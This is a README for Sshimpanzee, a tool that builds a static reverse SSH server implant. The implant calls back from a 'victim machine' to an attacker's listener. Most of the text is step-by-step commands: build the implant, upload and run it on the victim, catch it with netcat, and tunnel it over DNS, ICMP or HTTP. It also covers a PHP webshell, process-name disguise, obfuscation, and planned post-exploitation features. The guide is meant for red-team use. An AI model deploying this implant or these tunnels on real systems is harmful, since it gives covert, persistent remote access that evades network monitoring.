# Sshimpanzee
__Sshimpanzee__ allows you to build a __static *reverse* ssh server__.
Instead of listening on a port and waiting for connections, the ssh server will initiate a reverse connect to attacker's ip, just like a regular reverse shell.
__Sshimpanzee__ allows you to take advantage of __every features of a regular ssh__ connection, like __port forwards, dynamic socks proxies, or FTP server__.

More importantly, if a direct connection from the victim machine to the attacker server is not possible, it provides different tunnelling mecanisms such as __DNS Tunnelling, ICMP Tunnelling, or HTTP Encapsulation__.
It also supports HTTP and SOCKS5 proxies.

## Build

```sh
git submodule init  
git submodule update
```

```sh
./builder.py -r REMOTE:PORT 
```

> Subsequent build could build faster by avoiding openssh reconfiguration using __--no-reconf__ flag.

## Usage 

1) Build the binary with `-r` to specify the remote address to connect to, here 192.168.0.2 port 8097. 
```
./builder.py -r 192.168.0.2:8097 
```
builder.py generates the __sshd__ binary as well as a `keys` directory containing client and server ssh keys. The `keys/CLIENT` is the client __private__ key. It is the one used to authenticate to the reverse sshd server. Only ed25519 key authentication is supported.

2) Upload sshd binary on the victim machine
3) On your listening server, upload the private key
4) Still on server, run the standard ssh client with a netcat proxy command:

``` 
ssh anyrandomname@127.0.0.1 -oProxyCommand="nc -lp 8097" -i CLIENT
```

5) On the victim machine run the binary:
```
./sshd
```
Alternatively use -d option if you want debug information. Note that, in debug mode, sshd will not fork and will stay in foreground.
```
./sshd -d
```

6) 192.168.0.2 should have received the connection.

### Dynamic mode

It is possible to provide remote address and port at runtime through environment variables.
To do so, build sshimpanzee with `-D` option. 
```
./builder.py -D
```
Then, at runtime simply specify the `REMOTE` and `PORT` environment variables:
```
REMOTE=192.168.0.2 PORT=8097 ./sshd29u28u29u
```



## Tunnels 

Currently sshimpanzee support several ways for the implant to reach out to the attacker ssh client:  
- DNS Tunnelling using dns2tcp protocol   
- Through Proxy :  HTTP/SOCKS4/SOCKS5   
- Sockets : (might be usefull if you want to implement your own tunnels)   
- ICMP tunnel   
- HTTP Encapsulation

The `--tun` argument is used to enable tunneling:
```
--tun tunnelname,tunneloption1=...,tunneloption2=... 
--tun help
```

### Use DNS Tunneling

1) Build the binary
```
./builder.py --tun dns,dnsserv=<SERVER> 
```

2) On your server run the standard __dns2tcpd__ using the config file in this repo, you will need to modify the domain (and resource port if you want).
```
listen = 0.0.0.0
port = 53
user = nobody
key = sshimpanzee
chroot = /var/empty/dns2tcp/
domain = <SERVER>
resources = sshimpanzee:127.0.0.1:8080
```

```
sudo ./dns2tcpd -F -f dns2tcpdrc
```

3) Run ssh on client side as follow:

``` 
ssh anyrandomname@127.0.0.1 -oProxyCommand="nc -lp 8080" -i CLIENT
```

### Use ICMP Tunneling

1) Build the binary and icmptunnel server.
```
./builder.py --tun icmp,remote=<IP>,buildserv 
```

2) upload the `build/icmptunnel` binary on the server receiving the connect back

3) Still on your server, add the correct capabilities to avoid running the proxycommand as root and disable ping response from the system
``` 
sudo setcap cap_net_raw+ep icmptunnel
echo 1 | sudo dd of=/proc/sys/net/ipv4/icmp_echo_ignore_all 
```

4) Run the standard ssh client with icmptunnel as proxycommand:
```
ssh i -oProxyCommand=./icmptunnel -i test/CLIENT 
```


### Use HTTP Encapsulation (ssh -> http server -> sshd)

1) Build the binary
```
./builder.py --tun http_enc
```

2) Upload the file /tuns/http_enc/proxy.php and sshd files to your target web server

3) Make sure proxy.php is correctly executed 

4) Run sshd binary on the webserver

5) run ssh on client machine with python script in utils/scripts/ as proxy command :
You can edit proxy_cli.py script to specify proxies.

```
ssh -o ProxyCommand='python proxy_cli.py http://127.0.0.1:8080/proxy.php EncryptionKey 2>/dev/null' a@a -i ../../keys/CLIENT 
```
#### Side notes about http Encapsulation
1) Proxy.php is a minimal webshell, you can use it to upload sshd to the server and run commands. proxy_cli.py offers --run and --drop options to do so.

2) You might experience a huge input lag, it is because a delay of 1 to 5 second is added to the packet sent by ssh client to prevent from generating to many http request. If you don't mind generating a lot of http request (thus a lot of logs on the web server) add the --no-buffer option to proxy_cli.py command.


### One Tunnel to rule them all
A way to combined every tunnel was introduced to get a single binary capable of every method described above.
It is a really hacky solution which would deserve a refactor but it is still usable currently.
Use the following command to generate a single binary combining every tunnels (and their corresponding server).
```
./builder.py --tun combined,tunnels=dns:icmp:sock:proxysock:http_enc,obfuscate,path_fd=/dev/shm/sshim,buildserv
```

To use the generated sshd you will need to specify the `MODE` environment variables and other environment variable required by each tunnel:
``` 
MODE=icmp REMOTE=10.0.0.1 ./sshd -d
MODE=dns REMOTE=<YOUR DOMAIN> <RESOLVER=CUSTOM RESOLVER IF NEEDED> ./sshd -d 
MODE=proxysock http_proxy=http://127.0.0.1:8080 REMOTE=10.0.0.1 PORT=8000 ./sshd -d
MODE=http_enc ./sshd
# Because it is generated in tunnel mode, you can not use the standard direct connect, but it is still possible to use the "sock" tunnel and specify REMOTE and PORT 
MODE=sock REMOTE=10.0.0.1 PORT=8000 ./sshd -d
```


## Using the sshimpanzee client
This repo also provide a client located in __utils/client/bin__.
Simply copy the CLIENT key in utils/client/keys/
```
sshimpanzee --new PORT #create a new listener on PORT
sshimpanzee --new-dns #create a new DNS listener (Don't forget to modify utils/client/config/dnsconf.txt)
sshimpanzee --new-icmp #create a new icmp listener
sshimpanzee --new-http PROXY_PHP_URL #create a new HTTP Session 

sshimpanzee --list #list availaible sessions

sshimpanzee --get SESSION_NUMBER #to jump into a session any extra parameters are passed as ssh params
sshimpanzee --rename SESSION_NUMBER #to rename a session
sshimpanzee --kill SESSION_NUMBER #to kill a session
sshimpanzee #use fzf to select which session you want
```

However it might be less reliable than using ssh directly.

## Create your own tunnel mecanism
Every tunnels are available in the tuns/ directory. If you want to add another tunnel, simply add a function with the name of your tunnel in tuns/builder.py. This function is responsible to generate a libtun.a archive containing as many .o as necessary with one of them exporting a tun() symbole.
Alternatively, you build the libtun.a yourself and use the tunnel called no_build, and provide the path to your custom libtun.a


## Wanna build it for a different architecture ?

- Building for arm on arch linux: 
```
 ./builder.py -r 127.0.0.1:9090 --no-musl --cross-comp arm-linux-musleabi --extra-ldflags='-L/usr/lib/arm-musl/lib' -C arm-linux-musleabi-gcc
```


## Options

```
usage: builder.py [-h] [--remote REMOTE] [--no-keygen] [--no-reconf] [--no-musl] [--no-make]
                  [--no-banner] [--tunnel [TUN]] [--verbose] [--cross-comp [CROSS_COMP]]
                  [--compiler COMPILER] [--extra-cflags [EXTRA_CFLAGS]]
                  [--extra-ldflags [EXTRA_LDFLAGS]] [--public-key [PUBLIC_KEY]] [--shell [SHELL]]
                  [--timer [TIMER]] [--force-clean-build] [--proc-name PROCESS_NAME]

Builder for Reverse SSHD server.

options:
  -h, --help            show this help message and exit
  --remote REMOTE, -r REMOTE
                        Remote Host:Port
  --no-keygen           Do not generate key
  --no-reconf           Do not rerun ./configure before building
  --no-musl             Avoid building musl lib, usefull if cross-compiling
  --no-make             Only generate sshd.h, keys and makefile, do not build
  --no-banner           Do not put the shimpanzee banner in sshd
  --tunnel [TUN]        Tunnelling using various method, try --tun help to get the complete list of
                        tunnels and their related options
  --verbose, -v         Verbosity level, -v -vv
  --cross-comp [CROSS_COMP]
                        host as passed to configure
  --compiler COMPILER, --cc COMPILER, -C COMPILER
                        Compiler to be used
  --extra-cflags [EXTRA_CFLAGS]
                        Extra parameters to pass as cflags to openssh and dependancies (usefull for
                        cross compile)
  --extra-ldflags [EXTRA_LDFLAGS]
                        Extra parameters to pass as ldflags to openssh and dependancies (usefull for
                        cross compile) (
  --public-key [PUBLIC_KEY], -k [PUBLIC_KEY]
                        Public key to use for client authentication
  --shell [SHELL], -s [SHELL]
                        User shell, default to /bin/sh
  --timer [TIMER], -t [TIMER]
                        Timer between 2 reverse connection attempt in microsecond). (default
                        60*1000*1000, 1 minute)
  --force-clean-build   clean and rebuild dependancies (musl and openssh)
  --proc-name PROCESS_NAME, -P PROCESS_NAME
                        Process name on victim machine

Please provide at least a remote address or a tunnel.
Examples:
./builder.py -r attacker.machine:4444
./builder.py --tun dns,dnsserv=attacker.machine
./builder.py --tun icmp,remote=192.168.0.1
```

## Future Work
- Add other tunnels :
  - HTTP Encapsulation (First step through http_enc and proxy.php : add JSP and other programs ) 
  - Userland TCP/IP Stack with raw sock ?
  - ICMP : Xor/Encrypt string to avoid detection in case of network analysis 
  - Dynamic mode, packaging every tunnel and reconfigurable
  - Subsystem for post exploitation: 
	- Procdump
	- inject 
	- memfd exec
  

## Bugs
#### Need for clean build
Sometime after building with tunnels sshimpanzee won't build correctly. 
One way to solve the problem is to use the --force-clean-build flag. 
#### Tunnels and Cross Compilation 
It might no be possible to crosscompile with tunnel support. In this setup, it is recommended to build the tunnel separately. Try to apply the patches manually, build the libtun.a archive and link it using the `--tun no_build,path=` option on the builder.

## Thanks

This repository relies on a lot of different project. 
- First of all, Openssh-portable (9.1) : https://github.com/openssh/openssh-portable
- The musl libc to build it statically : https://wiki.musl-libc.org/

For the tunnels: 
- Dns2tcp : https://github.com/alex-sector/dns2tcp
- icmptunnel (heavily modified to improve tunnel resiliency) : https://github.com/DhavalKapil/icmptunnel.git
- Proxysocket : https://github.com/brechtsanders/proxysocket


It is important to note that it is *not* a very original project, weaponizing ssh protocol has already been done several years ago:
- https://github.com/Marc-andreLabonte/blackbear 
- https://github.com/Fahrj/reverse-ssh
- https://github.com/NHAS/reverse_ssh


